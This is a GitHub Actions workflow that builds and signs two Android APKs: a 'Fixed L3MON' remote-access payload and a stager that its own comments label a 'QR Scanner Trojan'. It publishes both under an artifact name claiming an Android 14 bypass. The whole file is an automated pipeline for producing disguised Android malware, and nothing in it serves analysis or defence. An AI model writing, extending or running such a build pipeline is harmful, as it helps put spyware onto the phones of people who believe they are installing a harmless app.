name: Universal Stager-Payload Build

on:
  push:
    branches: [ master ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Set up JDK 8
        uses: actions/setup-java@v2
        with:
          java-version: '8'
          distribution: 'temurin'

      - name: Install Build Tools
        run: |
          wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
          wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar

      - name: Build Payload (Fixed L3MON)
        run: |
          # The payload is now in the /payload directory
          java -jar apktool.jar b ./payload -o unsigned_payload.apk
          java -jar sign.jar -a unsigned_payload.apk --allowResign

      - name: Build Stager (QR Scanner Trojan)
        run: |
          # The stager is now in the /stager directory
          java -jar apktool.jar b ./stager -o unsigned_stager.apk
          java -jar sign.jar -a unsigned_stager.apk --allowResign

      - name: Upload Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Android14-Bypass
          path: |
            *-aligned-debugSigned.apk
